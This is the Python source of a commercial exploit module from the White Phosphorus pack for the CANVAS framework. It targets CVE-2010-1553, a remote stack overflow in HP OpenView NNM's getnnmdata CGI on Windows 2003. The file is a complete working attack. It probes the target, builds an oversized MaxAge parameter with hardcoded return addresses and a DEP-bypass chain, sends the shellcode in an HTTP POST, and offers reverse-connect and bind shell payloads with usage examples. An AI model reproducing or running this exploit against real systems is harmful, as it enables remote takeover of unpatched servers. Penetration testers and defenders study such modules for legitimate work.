
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Hewlett-Packard OpenView NNM Getnnmdata CGI Remote Overflow"
DESCRIPTION = "Exploits a remote stack overflow in the HP NNM Getnnmdata CGI"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2010-05-11"
DOCUMENTATION["Repeatability"] = ""
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-084/"
DOCUMENTATION['CVE'] = "CVE-2010-1553"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1553'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Notes"] = """
"""

NOTES="""
WP> White Phosphorus Exploit Pack
WP> Hewlett-Packard OpenView NNM Getnnmdata CGI Remote Overflow
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows 2003 SP1-SP2

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell

Example:
./commandlineInterface.py  -v 1 -p 5555 -ifromcreatethread
./3rdparty/White_Phosphorus/exploits/wp_openviewnnm_getnnmdata/wp_openviewnnm_getnnmdata.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -v 0 -O payload:0
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003"]

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000), []],
    1 : ["Windows 2003 SP1-SP2 DEP", (0x00000000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows Other", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x26\x1a"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        ret = 0
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        s.send("GET /OvCGI/getnnmdata.exe HTTP/1.0\r\n\r\n")
        recv_str = s.recv(1024)
            
        if ((recv_str.find("Error:  CGI requires Topo")) > 0):
            self.log("WP> getnnmdata found")
            ret = 1
        else:
            self.log("WP> getnnmdata not found")
        
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()
        
        if self.version == 0:
            return 0
            
        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
                    
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):               
        buf = "topo=0&MaxAge=" + '\x58'*65535
        if self.version ==1: #Windows 2003 Sp1/2
            buf += struct.pack('<L', 0x77BB2563)        # RETURN OVERWRITE: POP EAX / RETN MSVCRT
            buf += struct.pack('<L', 0x5a23f001)        # sprintfValue  DATA section of ovsnmp.dll
            buf += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8)
        else:   #Windows Other
            buf += struct.pack('<L', 0x5a10a8cb)        # JMP ESP ovw.dll
            buf += struct.pack('<L', 0x5a23f001)        # sprintfValue  DATA section of ovsnmp.dll
            buf += wp_randomnops(4)                     # some nops for balance
                   
        buf += self.shellcode
        
        payload = "POST /OvCGI/getnnmdata.exe HTTP/1.1\r\n"
        payload += "Host: " + self.host + "\r\n"
        payload += "Accept-Encoding: identity\r\n"
        payload += "Content-Length: " + str(len(buf)) + "\r\n"
        payload += "Accept-Language: en\r\n"
        payload += "Content-Type: application/x-www-form-urlencoded\r\n"
        payload += "Accept: text/html\r\n"
        payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\r\n\r\n"
        payload += buf
        payload += "\r\n\r\n"
        
        return payload


    def run(self):
        self.getArgs()
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            
            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            #print s.recv(1024)
            
            time.sleep(1)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s,True)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
